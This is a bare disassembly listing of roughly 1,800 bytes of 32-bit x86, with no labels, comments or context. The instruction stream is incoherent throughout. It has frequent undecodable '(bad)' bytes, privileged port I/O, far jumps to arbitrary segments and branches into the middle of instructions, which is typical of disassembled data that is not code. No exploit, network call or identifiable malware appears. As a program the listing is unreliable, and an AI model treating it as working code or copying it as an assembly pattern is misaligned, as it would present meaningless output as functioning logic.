  419280:	xor    al,0xc2
  419282:	das    
  419283:	(bad)  
  419284:	cmp    eax,0xd6438e2c
  419289:	pop    ds
  41928a:	loop   0x4192ef
  41928c:	pop    edi
  41928d:	mov    ebp,0xcc0e6238
  419292:	xchg   esp,eax
  419293:	dec    DWORD PTR [edx+ebp*8-0x11]
  419297:	fist   DWORD PTR [edi+ecx*4-0x56efd053]
  41929e:	mov    esi,0x39e307ec
  4192a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192a4:	mov    esp,0xf25023a1
  4192a9:	dec    esp
  4192aa:	xchg   ebp,eax
  4192ab:	pop    ss
  4192ac:	ins    BYTE PTR es:[edi],dx
  4192ad:	in     eax,dx
  4192ae:	sar    DWORD PTR [edi-0x7b],cl
  4192b1:	ret    
  4192b2:	mov    ecx,0x6d99ed3f
  4192b7:	pop    ecx
  4192b8:	mov    dh,0xc3
  4192ba:	clc    
  4192bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192bc:	iret   
  4192bd:	sub    DWORD PTR [ebx+0x67b74005],esi
  4192c3:	mov    bl,0x3b
  4192c5:	shr    BYTE PTR [edx+ecx*1],1
  4192c8:	mov    bl,0x58
  4192ca:	(bad)  
  4192cb:	(bad)  [esi+0x5955d9bb]
  4192d1:	sti    
  4192d2:	fs push ebp
  4192d4:	xchg   edx,eax
  4192d5:	or     DWORD PTR [ebp-0x26010dbb],ebx
  4192db:	cmp    DWORD PTR [edx-0x47],edx
  4192de:	sbb    eax,DWORD PTR [esi-0x72]
  4192e1:	cmp    ebp,DWORD PTR [eax]
  4192e3:	stos   WORD PTR es:[edi],ax
  4192e5:	stc    
  4192e6:	aaa    
  4192e7:	adc    ecx,DWORD PTR [edi+ebx*4+0x5d]
  4192eb:	ss out dx,eax
  4192ed:	pop    edx
  4192ee:	jno    0x419294
  4192f0:	mov    esp,DWORD PTR [ebp-0x43a4d082]
  4192f6:	mov    bl,0x24
  4192f8:	push   esp
  4192f9:	sahf   
  4192fa:	inc    edx
  4192fb:	lahf   
  4192fc:	out    dx,eax
  4192fd:	icebp  
  4192fe:	repnz jecxz 0x4192ee
  419301:	xchg   ecx,eax
  419302:	imul   esi,DWORD PTR [ecx+0xa81e7ab],0xffffffeb
  419309:	adc    BYTE PTR [edx-0x56],dh
  41930c:	shl    BYTE PTR [ebp-0x4e],cl
  41930f:	jp     0x419372
  419311:	push   esi
  419312:	fiadd  WORD PTR [ebx]
  419314:	or     BYTE PTR [ecx-0x4f],al
  419317:	mov    dh,ch
  419319:	or     al,0x32
  41931b:	ja     0x41930f
  41931d:	into   
  41931e:	in     eax,0x3d
  419320:	push   0x472f6813
  419325:	push   ds
  419326:	(bad)  
  419327:	shl    BYTE PTR [ecx],0x7b
  41932a:	(bad)  
  41932c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41932d:	push   esi
  41932e:	neg    ch
  419330:	rcr    ah,0x3c
  419333:	add    al,0x97
  419335:	enter  0xc5b0,0x9e
  419339:	sar    BYTE PTR [esi-0x3b4d1094],0x2b
  419340:	test   DWORD PTR [ebx-0x838c1e0],0xce2dbea6
  41934a:	xor    edi,DWORD PTR [esi]
  41934c:	lea    esi,[edx-0x5c]
  41934f:	lea    eax,[edx+0x56]
  419352:	or     DWORD PTR [ebx+ebx*4-0x2b1bac3e],ebx
  419359:	xchg   esi,eax
  41935a:	adc    eax,0xc6b74e5d
  41935f:	lods   eax,DWORD PTR ds:[esi]
  419360:	lds    eax,FWORD PTR [ebx]
  419362:	and    al,0x8f
  419364:	mov    al,0x2f
  419367:	iret   
  419368:	call   DWORD PTR [esi]
  41936a:	mov    cl,0x2c
  41936c:	fidiv  WORD PTR [edx]
  41936e:	into   
  41936f:	cld    
  419370:	cmp    ebp,DWORD PTR gs:[edi+0x186b53ed]
  419377:	jge    0x4193d0
  419379:	pop    eax
  41937a:	xchg   ebp,eax
  41937b:	adc    esi,DWORD PTR [ebx+edx*2-0x29af2433]
  419382:	test   eax,0x1a0e1d23
  419387:	icebp  
  419388:	jmp    0x428866d1
  41938d:	sub    BYTE PTR [eax-0x19],dl
  419390:	sahf   
  419391:	sub    dl,BYTE PTR [edi+0x6544cd08]
  419397:	fiadd  WORD PTR [edi+0x7b]
  41939a:	inc    edx
  41939b:	jne    0x41939f
  41939d:	into   
  41939e:	in     al,dx
  41939f:	jp     0x419402
  4193a1:	gs test al,0xb4
  4193a4:	fidiv  WORD PTR [edi+0x629f6534]
  4193aa:	test   al,0xb7
  4193ac:	mov    ah,0xde
  4193ae:	in     al,dx
  4193af:	adc    DWORD PTR [eax],esi
  4193b1:	mov    ds:0x3fedd16,eax
  4193b6:	mov    ds:0x9160f89,al
  4193bb:	ins    BYTE PTR es:[edi],dx
  4193bc:	retf   
  4193bd:	add    cl,dh
  4193bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c0:	(bad)  
  4193c1:	and    eax,0x959e47d3
  4193c6:	and    bh,bh
  4193c8:	rol    esi,cl
  4193ca:	sbb    edi,edx
  4193cc:	cmp    eax,0xd33f83e4
  4193d1:	js     0x4193ec
  4193d3:	xchg   ebp,eax
  4193d4:	out    dx,al
  4193d5:	retf   0x2820
  4193d8:	out    0x91,al
  4193da:	jb     0x41944b
  4193dc:	add    ch,al
  4193de:	pop    eax
  4193df:	ror    BYTE PTR [edi+0x5e],cl
  4193e2:	xchg   DWORD PTR [edi-0x4],ebp
  4193e5:	pop    ds
  4193e6:	stc    
  4193e7:	fxch   st(5)
  4193e9:	jbe    0x4193af
  4193eb:	ror    DWORD PTR [ecx],cl
  4193ed:	leave  
  4193ee:	stos   DWORD PTR es:[edi],eax
  4193ef:	lds    ebp,FWORD PTR [eax]
  4193f1:	int3   
  4193f2:	pop    ds
  4193f3:	xchg   edi,eax
  4193f4:	call   0x9c49d634
  4193f9:	(bad)  
  4193fa:	lds    esp,FWORD PTR [eax]
  4193fc:	int3   
  4193fd:	aam    0xd
  4193ff:	imul   ebx,ecx,0xb6fb3469
  419405:	xor    ah,BYTE PTR [esi]
  419407:	dec    ebp
  419408:	enter  0x3d13,0xd0
  41940c:	cmp    ecx,DWORD PTR [di]
  41940f:	xchg   ecx,eax
  419410:	shr    BYTE PTR [eax],cl
  419412:	dec    esi
  419413:	sbb    eax,0x7c20c0eb
  419418:	xchg   DWORD PTR [eax],eax
  41941a:	and    BYTE PTR [ebx+0x78],bl
  41941d:	push   cs
  41941e:	sub    esp,0x2f3557b8
  419424:	mov    edx,es
  419426:	aaa    
  419427:	cmc    
  419428:	stos   BYTE PTR es:[edi],al
  419429:	mov    ah,0xcf
  41942b:	sbb    BYTE PTR [edx+0x2da772fe],bl
  419431:	bound  ebx,QWORD PTR [edi-0x5]
  419434:	add    eax,0x917958d9
  419439:	or     dl,BYTE PTR ds:0xf8dca080
  41943f:	cdq    
  419440:	mov    edi,gs
  419442:	xchg   esi,eax
  419443:	dec    ecx
  419444:	or     al,0xc2
  419446:	jb     0x41947c
  419448:	and    BYTE PTR [ebx+0x2e],dl
  41944b:	(bad)  
  41944c:	xor    ecx,DWORD PTR [eax-0x5b]
  41944f:	cdq    
  419450:	mov    dl,0x13
  419452:	repz or eax,0xb375af06
  419458:	cmp    DWORD PTR [ebx],0x35c331d7
  41945e:	sar    BYTE PTR [edi-0x28cda048],cl
  419464:	jmp    0x8b24e512
  419469:	cmp    ebx,0x65aaee86
  41946f:	and    BYTE PTR [esi],ah
  419471:	dec    edi
  419472:	loopne 0x41945a
  419474:	sub    eax,0x121f463d
  419479:	fstp   QWORD PTR [esi]
  41947b:	mov    ah,0x27
  41947d:	cmp    al,0x88
  41947f:	adc    BYTE PTR [ebx],dl
  419481:	sbb    DWORD PTR [edi],esi
  419483:	jg     0x419501
  419485:	dec    ebx
  419486:	fnstsw WORD PTR [eax]
  419488:	inc    edi
  419489:	ret    
  41948a:	fild   WORD PTR [ecx+0x12d5c952]
  419490:	xor    DWORD PTR [ebp-0x42e01cc2],ebp
  419496:	push   ecx
  419497:	add    DWORD PTR [eax-0x27f999e],0xb7e74b6c
  4194a1:	pop    edx
  4194a2:	call   0x6e3ead71
  4194a7:	shl    DWORD PTR [ecx+eax*8-0x50],1
  4194ab:	xor    bl,bh
  4194ad:	or     al,0xb4
  4194af:	mov    ecx,DWORD PTR [ecx]
  4194b1:	or     edi,esi
  4194b3:	rcl    BYTE PTR ds:0xa165f555,1
  4194b9:	test   BYTE PTR [edi-0x54],bh
  4194bc:	adc    edx,DWORD PTR [ebp+ecx*8+0x5d23ff04]
  4194c3:	fmul   st(6),st
  4194c5:	pushf  
  4194c6:	outs   dx,DWORD PTR ds:[esi]
  4194c7:	pop    esi
  4194c8:	jmp    0x3c6e:0x615af445
  4194cf:	inc    eax
  4194d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194d1:	cmp    ah,dl
  4194d3:	adc    esp,DWORD PTR [ebx-0x33]
  4194d6:	jno    0x4194cd
  4194d8:	mov    ss,WORD PTR [ecx+0x72]
  4194db:	in     eax,dx
  4194dc:	loop   0x4194a4
  4194de:	fcom   QWORD PTR [edx]
  4194e0:	lahf   
  4194e1:	out    dx,al
  4194e2:	je     0x41954f
  4194e4:	out    dx,al
  4194e5:	xchg   BYTE PTR [esi-0x55],ch
  4194e8:	fild   QWORD PTR [ebp+0x25]
  4194eb:	call   0x1403:0xb0c76426
  4194f2:	imul   eax,edi,0xfffffffa
  4194f5:	jb     0x41947d
  4194f7:	test   DWORD PTR [ecx+ebx*4+0x50348413],edx
  4194fe:	jb     0x41950e
  419500:	push   ecx
  419501:	jns    0x41949b
  419503:	xabort 0xff
  419506:	xor    al,al
  419508:	call   0x4b87:0x95dfb38
  41950f:	pop    edi
  419510:	rol    BYTE PTR [esi],0x63
  419513:	adc    edi,DWORD PTR [edi+0x2efed25]
  419519:	mov    ds:0x6ab78e54,eax
  41951e:	push   esp
  41951f:	jmp    0xbe6a1f84
  419524:	and    eax,0x109100b9
  419529:	dec    ebx
  41952a:	iret   
  41952b:	add    ah,ch
  41952d:	enter  0x77df,0x26
  419531:	loopne 0x41959b
  419533:	inc    esi
  419534:	out    dx,eax
  419535:	adc    eax,0xb5fa763a
  41953a:	div    BYTE PTR fs:[ebx+0x6048e0e0]
  419541:	push   0x489e6400
  419546:	ins    DWORD PTR es:[edi],dx
  419547:	cmp    eax,0x762e595e
  41954c:	stc    
  41954d:	xor    eax,0xa04e9549
  419552:	(bad)  
  419553:	(bad)  
  419554:	sti    
  419555:	call   0xbf2e:0x3bf5eba7
  41955c:	xchg   BYTE PTR ds:0xc2c81d87,dl
  419562:	or     eax,0xb07211f8
  419567:	push   ebp
  419568:	inc    esp
  419569:	dec    eax
  41956a:	or     BYTE PTR [ebp+0x78a7fbc9],al
  419570:	je     0x41953f
  419572:	adc    eax,DWORD PTR [eax+ebx*4-0x5e]
  419576:	(bad)  
  419577:	cmc    
  419578:	ror    edx,cl
  41957a:	mov    ebp,DWORD PTR [ebp+0x28817427]
  419580:	loope  0x4195e7
  419582:	je     0x419563
  419584:	jne    0x4195c1
  419586:	and    ebx,DWORD PTR [edx]
  419588:	xor    DWORD PTR [esi],ebx
  41958a:	dec    ebx
  41958b:	in     eax,0x30
  41958d:	enter  0xec8b,0xd5
  419591:	and    al,0xbf
  419593:	mov    edx,0x236ccdf2
  419598:	aam    0xe4
  41959a:	repz push cs
  41959c:	and    eax,0x3e517d33
  4195a1:	stc    
  4195a2:	std    
  4195a3:	cmp    ecx,DWORD PTR cs:[esi-0x2c]
  4195a7:	sbb    DWORD PTR [ebx-0x22c91edd],eax
  4195ad:	(bad)  
  4195ae:	pushf  
  4195af:	jmp    0x8aaa4cd1
  4195b4:	xchg   esp,eax
  4195b5:	js     0x4195d7
  4195b7:	sub    dl,ch
  4195b9:	lahf   
  4195ba:	mov    WORD PTR [esi-0x1025809f],es
  4195c0:	xchg   esi,eax
  4195c1:	xor    bh,BYTE PTR [ebp-0x40a55ca7]
  4195c7:	xor    bh,BYTE PTR [eax+edx*4]
  4195ca:	popa   
  4195cb:	pop    esi
  4195cc:	mov    al,0x25
  4195ce:	shl    DWORD PTR [edx+0x29fd2b9d],1
  4195d4:	lea    esp,[edi-0x766567e9]
  4195da:	inc    esp
  4195db:	mov    cl,0xa9
  4195dd:	clc    
  4195de:	int    0x2
  4195e0:	mov    al,0x74
  4195e2:	push   esi
  4195e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195e4:	push   edi
  4195e5:	xor    ecx,DWORD PTR [esi-0x25]
  4195e8:	shl    BYTE PTR [ebx-0x73],1
  4195eb:	adc    al,al
  4195ed:	iret   
  4195ee:	push   esp
  4195ef:	mov    edi,0x7e406229
  4195f4:	mov    ch,0x26
  4195f6:	and    esi,ebx
  4195f8:	cmc    
  4195f9:	push   ecx
  4195fa:	lods   eax,DWORD PTR ds:[esi]
  4195fb:	js     0x4195fc
  4195fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195fe:	stc    
  4195ff:	dec    esi
  419600:	mov    dh,0x5
  419602:	push   0x52bc4fce
  419607:	cmp    eax,0x8037018b
  41960c:	das    
  41960d:	scas   eax,DWORD PTR es:[edi]
  41960e:	adc    esi,DWORD PTR [edi-0x717cfab9]
  419614:	fwait
  419615:	cs and eax,0x4e
  419619:	jns    0x419627
  41961b:	or     BYTE PTR [edi+0x13],dh
  41961e:	inc    ebx
  41961f:	xor    ecx,DWORD PTR [ebx]
  419621:	imul   eax
  419623:	adc    DWORD PTR [edi-0x7e],ebx
  419626:	js     0x4195da
  419628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419629:	adc    eax,0xe2ea881c
  41962e:	jg     0x4195b5
  419630:	aad    0x3e
  419632:	test   eax,0x9e841139
  419637:	call   DWORD PTR [edi+0x7d]
  41963a:	jmp    0x57f36eeb
  41963f:	adc    DWORD PTR [edx+eiz*8-0x11b97b2a],ebp
  419646:	push   ds
  419647:	cmp    BYTE PTR [edi+0x23],0x3a
  41964b:	mov    ss,WORD PTR [edi+0x6a51b48d]
  419651:	xchg   ebx,eax
  419652:	or     BYTE PTR [edi],bh
  419654:	pop    ebp
  419655:	push   cs
  419656:	sar    DWORD PTR [ebp+0x46],1
  419659:	dec    ecx
  41965a:	add    DWORD PTR [ebx+edx*8],ecx
  41965d:	fidivr DWORD PTR [esi+0x1538666b]
  419663:	pop    ebp
  419664:	push   edi
  419665:	std    
  419666:	dec    eax
  419667:	test   BYTE PTR gs:[esi+0x105a0ec2],ah
  41966e:	push   edx
  41966f:	mov    al,0x45
  419671:	std    
  419672:	call   0x8004:0xd750dcac
  419679:	sbb    edi,DWORD PTR [edi+0x663756cd]
  41967f:	out    dx,al
  419680:	imul   eax,DWORD PTR [edi],0xffffffe5
  419683:	mov    dl,0x71
  419685:	cld    
  419686:	js     0x419629
  419688:	xchg   ebx,eax
  419689:	mov    ds:0x5b4dbc5d,eax
  41968e:	sbb    esp,DWORD PTR [ecx]
  419690:	xor    ecx,DWORD PTR [ebx+0x63c827f7]
  419696:	fimul  WORD PTR [eax-0x2a]
  419699:	mov    esp,0x951a3ffd
  41969e:	lds    edx,FWORD PTR [edi+esi*2]
  4196a1:	(bad)  
  4196a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a3:	inc    edx
  4196a4:	scas   al,BYTE PTR es:[edi]
  4196a5:	adc    ah,al
  4196a7:	lea    edx,[esi-0x1a]
  4196aa:	push   cs
  4196ab:	dec    edx
  4196ac:	in     al,dx
  4196ad:	xor    DWORD PTR [eax+0x4e],esp
  4196b0:	fidiv  DWORD PTR [ecx+edi*1-0x39]
  4196b4:	sub    al,0x64
  4196b6:	xchg   esp,eax
  4196b7:	add    ecx,ecx
  4196b9:	xchg   ebp,eax
  4196ba:	sbb    al,0x90
  4196bc:	rcr    BYTE PTR [edi+0x74],0xeb
  4196c0:	aas    
  4196c1:	mov    eax,ds:0xd005b12a
  4196c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196c7:	dec    ah
  4196c9:	in     eax,0xe2
  4196cb:	loopne 0x419670
  4196cd:	(bad)  
  4196ce:	ficomp DWORD PTR [edx-0x606b7654]
  4196d4:	fnstcw WORD PTR [edi]
  4196d6:	mov    al,0x93
  4196d8:	jmp    0xd2d5:0x533c0474
  4196df:	(bad)  
  4196e0:	scas   eax,DWORD PTR es:[edi]
  4196e1:	sub    esp,DWORD PTR [eax]
  4196e3:	dec    eax
  4196e4:	les    esi,FWORD PTR [eax+0x33]
  4196e7:	cmp    esi,DWORD PTR [edi]
  4196e9:	or     ebp,DWORD PTR [ecx+0x33]
  4196ec:	and    esi,ebx
  4196ee:	rcr    DWORD PTR [ecx-0x78],1
  4196f1:	push   ss
  4196f2:	(bad)
  4196f5:	cmp    ch,BYTE PTR [ebp-0x44d521b7]
  4196fb:	sub    eax,0x62824be8
  419700:	aad    0x20
  419702:	sub    DWORD PTR [eax],edi
  419704:	jecxz  0x419706
  419706:	lods   eax,DWORD PTR ds:[esi]
  419707:	cli    
  419708:	xor    DWORD PTR [edi+0x4e],esp
  41970b:	dec    ebp
  41970c:	lock fwait
  41970e:	test   DWORD PTR [eax+0x48e4af2b],esp
  419714:	mov    esp,DWORD PTR [ebx+0x2cfd6cf3]
  41971a:	dec    esi
  41971b:	inc    esp
  41971c:	scas   al,BYTE PTR es:[edi]
  41971d:	stc    
  41971e:	and    BYTE PTR [ebp+0x73],ch
  419721:	sub    ebp,DWORD PTR [esi+0x9]
  419724:	pop    ebx
  419725:	xchg   edi,eax
  419726:	je     0x4196ef
  419728:	jo     0x419719
  41972a:	sbb    al,0x2c
  41972c:	add    eax,0x50bca0
  419731:	(bad)  
  419732:	shl    BYTE PTR [ebx+ecx*1],0xab
  419736:	clc    
  419737:	imul   esi,DWORD PTR [edi],0x2d
  41973a:	cmp    al,0xfd
  41973c:	call   0x7002:0x15ef73a6
  419743:	xchg   ebx,eax
  419744:	retf   0x4208
  419747:	or     BYTE PTR [esi-0x7a],ch
  41974a:	xlat   BYTE PTR ds:[ebx]
  41974b:	loope  0x419715
  41974d:	imul   edx,edi,0x7d4da9b
  419753:	in     eax,dx
  419754:	xor    DWORD PTR [ebp-0x323a3837],0x87eeb48e
  41975e:	and    ch,bl
  419760:	mov    eax,ds:0xc3956b0c
  419765:	in     eax,dx
  419766:	test   al,bh
  419768:	sbb    ebx,edi
  41976a:	out    dx,al
  41976b:	sub    bh,BYTE PTR [edx-0x43e5dab7]
  419771:	add    ecx,DWORD PTR [ebp-0x76950c70]
  419777:	(bad)  
  419778:	mov    esp,0xb66a5ef7
  41977d:	and    al,0x2e
  41977f:	sub    dh,ah
  419781:	icebp  
  419782:	repz js 0x419714
  419785:	shl    BYTE PTR [edx+0x59],cl
  419788:	adc    ecx,0xea7b08c9
  41978e:	dec    edi
  41978f:	inc    esi
  419790:	sub    eax,0xa2d5a79d
  419795:	gs jle 0x419724
  419798:	sbb    dh,BYTE PTR [ecx-0x60367b4a]
  41979e:	mov    bl,0x1c
  4197a0:	adc    BYTE PTR [ebp+0x3f],dl
  4197a3:	rcr    BYTE PTR [ebx-0x29],cl
  4197a6:	inc    ebp
  4197a7:	dec    esp
  4197a8:	loope  0x419803
  4197aa:	xor    DWORD PTR [esi-0x34],esi
  4197ad:	sub    DWORD PTR [ecx-0x3f],0xd7d82743
  4197b4:	or     edx,edx
  4197b6:	and    BYTE PTR [edx-0x42],0x98
  4197ba:	call   0x271c:0x263ed36d
  4197c1:	jno    0x41976d
  4197c3:	leave  
  4197c4:	std    
  4197c5:	mov    ds:0x328d2b59,al
  4197ca:	xor    DWORD PTR [esi],ebp
  4197cc:	cmp    al,ah
  4197ce:	adc    al,0x32
  4197d0:	cli    
  4197d1:	rol    ebx,cl
  4197d3:	imul   edi,DWORD PTR [edi+0x523143d],0x26d92835
  4197dd:	stc    
  4197de:	push   ebx
  4197df:	test   al,0xb0
  4197e1:	sbb    dh,bh
  4197e3:	aam    0x3e
  4197e5:	jle    0x419820
  4197e7:	sub    ah,BYTE PTR [ebx-0x28]
  4197ea:	aaa    
  4197eb:	and    edi,DWORD PTR [esi]
  4197ed:	or     al,0xb
  4197ef:	xchg   BYTE PTR [esp+eax*1],ch
  4197f2:	mov    eax,0xa17f58df
  4197f7:	add    ebx,eax
  4197f9:	popf   
  4197fa:	int3   
  4197fb:	cmp    al,0x69
  4197fd:	stos   BYTE PTR es:[edi],al
  4197fe:	ret    
  4197ff:	bound  esi,QWORD PTR [ebx-0x6ee74d6]
  419805:	in     eax,dx
  419806:	and    ebp,0x1
  419809:	pop    ss
  41980a:	cmc    
  41980b:	leave  
  41980c:	mov    esi,0xa19b25e7
  419811:	jecxz  0x419870
  419813:	add    al,0xc0
  419815:	xchg   ebp,eax
  419816:	sub    bl,bl
  419818:	(bad)  
  41981a:	jo     0x41985e
  41981c:	jge    0x419881
  41981e:	push   eax
  41981f:	xor    bl,BYTE PTR [ebp+0x7c317486]
  419825:	mov    edx,DWORD PTR [eax-0x237c682b]
  41982b:	lds    ebp,FWORD PTR [ecx-0x71936ab8]
  419831:	stos   DWORD PTR es:[edi],eax
  419832:	pop    edx
  419833:	pusha  
  419834:	adc    eax,0x56cf1ded
  419839:	mov    al,0x26
  41983b:	lds    ebx,FWORD PTR [eax]
  41983d:	outs   dx,DWORD PTR ds:[esi]
  41983e:	mov    edx,0xe82108c7
  419843:	jl     0x41989a
  419845:	jbe    0x419827
  419847:	dec    esi
  419848:	icebp  
  419849:	outs   dx,DWORD PTR ds:[esi]
  41984a:	scas   al,BYTE PTR es:[edi]
  41984b:	scas   eax,DWORD PTR es:[edi]
  41984c:	xchg   BYTE PTR [ecx],ch
  41984e:	rcl    BYTE PTR [ebp+0x35],0x33
  419852:	jnp    0x419825
  419854:	or     BYTE PTR [esi+0x69c4a5bb],al
  41985a:	add    BYTE PTR [ebx+0x14],ch
  41985d:	retf   
  41985e:	sub    eax,0x38a19988
  419863:	fistp  DWORD PTR ds:0x83273915
  419869:	jmp    0x41988d
  41986b:	pop    ebx
  41986c:	shl    DWORD PTR [esi-0x1d],cl
  41986f:	adc    ch,bl
  419871:	(bad)  
  419872:	test   al,0x67
  419874:	int    0x62
  419876:	outs   dx,BYTE PTR ds:[esi]
  419877:	sbb    BYTE PTR [esi],ah
  419879:	scas   al,BYTE PTR es:[edi]
  41987a:	out    dx,al
  41987b:	mov    edi,0xc4f66f64
  419880:	leave  
  419881:	push   edi
  419882:	pop    edi
  419883:	fidiv  WORD PTR [esi-0x80]
  419886:	fldenv [edx]
  419888:	popa   
  419889:	cli    
  41988a:	and    ah,bh
  41988c:	shl    eax,0xc0
  41988f:	imul   edx,DWORD PTR [eax],0x379e6026
  419895:	mov    DWORD PTR [esp+ebp*8+0x625b569],edx
  41989c:	push   ss
  41989d:	pop    ss
  41989e:	dec    esp
  41989f:	push   ds
  4198a0:	push   0xffffffcf
  4198a2:	not    al
  4198a4:	or     BYTE PTR [edx-0x39],0x98
  4198a8:	out    dx,al
  4198a9:	mov    esi,0xe320af10
  4198ae:	push   ss
  4198af:	xor    eax,0xa823bcd7
  4198b4:	adc    DWORD PTR [edx-0x41],eax
  4198b7:	mov    bh,BYTE PTR [eax+0x30fb8e29]
  4198bd:	std    
  4198be:	sbb    eax,0x14670bad
  4198c3:	pop    edx
  4198c4:	dec    eax
  4198c5:	pop    edx
  4198c6:	mov    al,ds:0x5592f47b
  4198cb:	std    
  4198cc:	shr    BYTE PTR [ecx-0x26a75752],0x1d
  4198d3:	mov    cl,0xbe
  4198d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d6:	push   edi
  4198d7:	stc    
  4198d8:	adc    BYTE PTR [edi+0x6a377b76],al
  4198de:	mov    bh,0x14
  4198e0:	shl    DWORD PTR [edx+0x55],1
  4198e3:	int    0x86
  4198e5:	and    eax,0x51d7ed1c
  4198ea:	jno    0x419961
  4198ec:	cdq    
  4198ed:	daa    
  4198ee:	pop    ebx
  4198ef:	jbe    0x41988f
  4198f1:	aad    0x4a
  4198f3:	inc    edx
  4198f4:	mov    esp,0x95ba4bd5
  4198f9:	adc    ecx,eax
  4198fb:	popa   
  4198fc:	cmp    dl,bl
  4198fe:	jmp    0x41b2:0x3ce99daa
  419905:	mov    ebp,0x89d8b2be
  41990a:	cdq    
  41990b:	in     eax,dx
  41990c:	ja     0x4198ad
  41990e:	lock retf 
  419910:	ret    0xc778
  419913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419914:	adc    al,0x26
  419916:	adc    BYTE PTR [ebx],cl
  419918:	in     al,0xd2
  41991a:	xchg   esi,eax
  41991b:	push   edx
  41991c:	xor    al,0xfc
  41991e:	xlat   BYTE PTR ds:[ebx]
  41991f:	mov    fs,WORD PTR [edi+0x4fe67248]
  419925:	inc    ebx
  419926:	mov    WORD PTR [ebp-0x56ef7f6],?
  41992c:	push   0xffffff98
  41992e:	les    eax,FWORD PTR [esi]
  419930:	add    eax,0x58a4ce7f
  419935:	sbb    eax,0xc0d79763
  41993a:	xor    eax,0xf24d2b4a
  41993f:	jecxz  0x41991d
  419941:	push   cs
  419942:	sbb    DWORD PTR [edi+0x7ac481dc],ecx
  419948:	and    eax,0x80bffa3c
  41994d:	xchg   edx,eax
  41994e:	js     0x419974
  419950:	inc    ebp
  419951:	adc    bh,BYTE PTR [eax]
  419953:	mov    edx,0xacac4e8b
  419958:	add    edx,DWORD PTR [ecx-0x55]
  41995b:	jp     0x419907
  41995d:	sahf   
  41995e:	jb     0x419908
  419960:	lahf   
  419961:	sti    
  419962:	ret    0x6138
  419965:	push   ds
  419966:	das    
  419967:	and    edi,DWORD PTR [edx]
  419969:	adc    edx,ebx
  41996b:	push   cs
  41996c:	mov    eax,0xe846031d
  419971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419972:	xor    BYTE PTR es:[eax-0x11],ah
  419976:	mov    ebx,0x468e0ad6
  41997b:	add    al,0xc1
  41997d:	not    BYTE PTR [ebx-0x3c61511e]
  419983:	into   
  419984:	mov    ch,ah
  419986:	orps   xmm4,xmm5
  419989:	nop
  41998a:	test   al,0x7
  41998c:	mov    fs,WORD PTR [edi+0x8]
  41998f:	jne    0x419968
  419991:	jno    0x419950
  419993:	add    BYTE PTR [ebx+0x5f49afcc],al
  419999:	mov    ds:0x15dc35f1,eax
  41999e:	(bad)  
  41999f:	in     al,0x9a
  4199a1:	enter  0x8f8,0xe5
  4199a5:	popa   
  4199a6:	pop    edi
  4199a7:	dec    ebp
  4199a8:	loopne 0x4199de
  4199aa:	retf   0x589c
  4199ad:	jbe    0x41994e
  4199af:	cmp    al,0x74
  4199b1:	sub    bl,dh
  4199b3:	dec    esp
  4199b4:	mov    al,ds:0x91780806
  4199b9:	call   0x15a6338e
  4199be:	xchg   edi,eax
  4199bf:	gs mov ebx,0x7c98b4f0
  4199c5:	shl    DWORD PTR [ebx],cl
  4199c7:	cmp    DWORD PTR [edi-0x7a],0xc462924
  4199ce:	mov    bh,0x98
  4199d0:	je     0x4199e8
  4199d2:	repnz dec ecx
  4199d4:	test   DWORD PTR [edi],esp
  4199d6:	loop   0x4199bc
  4199d8:	xor    dh,BYTE PTR [ecx+0x23]
  4199db:	jnp    0x419a17
  4199dd:	mov    ?,ebp
  4199df:	sub    al,0x65
  4199e1:	xlat   BYTE PTR ds:[ebx]
  4199e2:	jns    0x419a07
  4199e4:	je     0x419981
  4199e6:	adc    DWORD PTR [ecx-0x76],ebx
  4199e9:	push   ecx
  4199ea:	jecxz  0x4199b3
  4199ec:	push   ebx
  4199ed:	dec    ebp
  4199ee:	mov    dh,0x81
  4199f1:	ds loope 0x419a2b
  4199f4:	ins    BYTE PTR es:[edi],dx
  4199f5:	aas    
  4199f6:	out    0x14,al
  4199f8:	push   esp
  4199f9:	fmul   DWORD PTR [ecx]
  4199fb:	sbb    eax,0x5b3f107c
  419a00:	inc    edx
  419a01:	adc    al,0x4c
  419a03:	jb     0x419989
  419a05:	(bad)  
  419a06:	arpl   bp,bp
  419a08:	ficom  DWORD PTR [ebx+edi*8+0x10051bae]
  419a0f:	mov    bh,0xcd
  419a11:	jle    0x419a0e
  419a13:	add    ebx,ebx
  419a15:	and    ebx,DWORD PTR [ecx+0x6f9db3d]
  419a1b:	data16 int3 
  419a1d:	data16 in al,dx
  419a1f:	jbe    0x4199e0
  419a21:	sub    DWORD PTR [ebx],edi
  419a23:	fst    QWORD PTR [ecx]
  419a25:	push   ebx
  419a26:	mov    ebx,0x2abee33a
  419a2b:	ret    
  419a2c:	mov    bh,0xca
  419a2e:	push   eax
  419a2f:	imul   ecx,DWORD PTR [eax],0xffffff96
  419a32:	xor    al,0x5f
  419a34:	adc    eax,0x4d
  419a37:	sahf   
  419a38:	popf   
  419a39:	mov    esp,0x82ad3ba2
  419a3e:	sub    eax,edi
  419a40:	idiv   edx
  419a42:	add    bl,al
  419a44:	imul   esp,DWORD PTR [eax+0x1e0980cd],0xfe254630
  419a4e:	dec    edi
  419a4f:	lahf   
  419a50:	out    dx,eax
  419a51:	mov    cl,0xb7
  419a53:	push   cs
  419a54:	or     DWORD PTR [ecx+0x2b2567d4],esi
  419a5a:	call   0x853b49f4
  419a5f:	js     0x419a13
  419a61:	add    DWORD PTR [ecx-0x2a3645a3],esi
  419a67:	push   ebx
  419a68:	mov    ds:0x3ff210da,al
  419a6d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  419a6f:	test   ebp,edi
  419a71:	dec    esp
  419a72:	adc    ah,dl
  419a74:	xor    al,0xd3
  419a76:	add    eax,ecx
  419a78:	pop    ds
  419a79:	and    al,0x7d
